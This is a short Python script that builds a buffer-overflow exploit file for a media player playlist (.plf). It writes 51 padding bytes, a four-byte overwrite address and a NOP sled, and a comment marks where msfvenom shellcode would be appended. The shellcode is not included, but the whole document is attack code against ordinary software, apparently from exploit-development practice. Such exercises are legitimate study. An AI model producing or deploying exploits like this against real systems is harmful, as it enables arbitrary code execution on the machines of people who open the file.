pat="A"*51

buf = pat + "\x53\x5c\x34\x61" + "\x90"*20 # + shellcode from msfvenom
fn = "myfile.plf"

x = open(fn, 'w')
x.write(buf)

print("pattern created and playlist written")
x.close()
